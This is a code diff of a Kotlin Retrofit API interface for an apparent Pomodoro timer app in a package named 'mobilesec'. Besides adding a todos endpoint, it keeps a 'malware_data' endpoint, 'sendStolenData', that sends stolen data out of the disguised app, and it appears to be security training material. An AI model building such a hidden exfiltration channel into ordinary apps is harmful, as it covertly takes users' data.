@@ -3,9 +3,24 @@ package com.mobilesec.pomodorotimer.data.remote
 import retrofit2.Response
 import retrofit2.http.*
 
+//interface ApiService {
+//    @POST("todos")
+//    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncResponse>
+//
+//    @GET("user/stats")
+//    suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>
+//
+//    // Vulnerable endpoint for malware
+//    @POST("malware_data")
+//    suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
+//}
+
 interface ApiService {
     @POST("todos")
-    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncResponse>
+    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncRequest>
+
+    @GET("todos")
+    suspend fun getTodos(): Response<List<TodoSyncRequest>>
 
     @GET("user/stats")
     suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>
@@ -14,6 +29,7 @@ interface ApiService {
     @POST("malware_data")
     suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
 }
+
 
 data class TodoSyncRequest(
     val title: String,
